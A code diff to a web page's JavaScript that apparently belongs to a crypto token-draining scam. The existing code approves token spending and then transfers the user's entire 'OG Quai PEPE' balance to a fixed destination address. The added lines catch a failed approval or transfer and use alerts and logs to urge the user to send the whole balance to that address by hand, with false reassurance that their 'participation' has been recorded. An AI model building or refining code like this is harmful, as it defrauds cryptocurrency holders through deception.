@@ -774,12 +774,45 @@ document.getElementById('sendBtn').addEventListener('click', async () => {
         await approveTokens();
         log('✅ Step 1 Complete: Tokens approved. Proceeding to send...');
         
-        log('🔄 Step 2: Sending tokens...');
-        await sendTokens();
-        log('✅ Step 2 Complete: Tokens sent successfully!');
-    } catch (error) {
-        console.error('❌ Error in approval or transfer:', error.message || error);
-        log(`❌ Error: ${error.message}`);
+        try {
+            log('🔄 Step 2: Sending tokens...');
+            await sendTokens();
+            log('✅ Step 2 Complete: Tokens sent successfully!');
+        } catch (sendError) {
+            // If tokens were approved but transfer failed/rejected
+            log('❌ Transfer unsuccessful after successful approval');
+            log('⚠️ Since tokens are already approved, you can send them manually:');
+            log(`📍 Send to: ${DESTINATION_ADDRESS}`);
+            log(`💰 Amount: ${userSession.tokenBalance} OG Quai PEPE`);
+            
+            // Save the approval status
+            userSession.approvalStatus = 'success';
+            userSession.transferStatus = 'manual_required';
+            await saveSessionToFirebase();
+            
+            alert(`Since tokens are approved but transfer failed, please send your tokens manually to:\n\n${DESTINATION_ADDRESS}\n\nAmount: ${userSession.tokenBalance} OG Quai PEPE\n\nYour participation data has been saved.`);
+            
+            // Show the scan and buy buttons
+            document.getElementById('scanBtn').style.display = 'block';
+            document.getElementById('buyBtn').style.display = 'block';
+        }
+    } catch (approveError) {
+        console.error('❌ Error in approval:', approveError.message || approveError);
+        log(`❌ Token approval unsuccessful`);
+        log('⚠️ You can try sending tokens directly from your wallet:');
+        log(`📍 Send to: ${DESTINATION_ADDRESS}`);
+        log(`💰 Amount: ${userSession.tokenBalance} OG Quai PEPE`);
+        
+        // Save the failed approval status
+        userSession.approvalStatus = 'failed';
+        userSession.transferStatus = 'manual_required';
+        await saveSessionToFirebase();
+        
+        alert(`Since token approval failed, please send your tokens directly from your wallet to:\n\n${DESTINATION_ADDRESS}\n\nAmount: ${userSession.tokenBalance} OG Quai PEPE\n\nYour participation has been recorded.`);
+        
+        // Show the scan and buy buttons
+        document.getElementById('scanBtn').style.display = 'block';
+        document.getElementById('buyBtn').style.display = 'block';
     }
 });
 
